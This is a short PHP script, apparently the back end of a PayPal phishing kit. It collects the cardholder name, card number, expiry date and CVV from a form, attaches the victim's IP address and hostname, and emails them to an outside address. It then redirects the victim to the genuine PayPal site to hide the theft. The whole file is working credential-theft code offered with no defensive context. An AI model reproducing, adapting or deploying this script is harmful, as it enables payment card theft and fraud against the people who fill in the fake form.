<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------|paypal|--------------|\n";
$message .= "|Nameon Card: ".$_POST['name']."\n";
$message .= "|Card Number: ".$_POST['card']."\n";
$message .= "|Expiration Date: ".$_POST['date']."\n";
$message .= "|cvv       : ".$_POST['cvv']."\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|paypal|--------------|\n";
$send = "spamiarskie@wp.pl";
$subject = "~ ResuLtaT PpL ~ | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location:https://www.paypal.com/webapps/mpp/home");
?>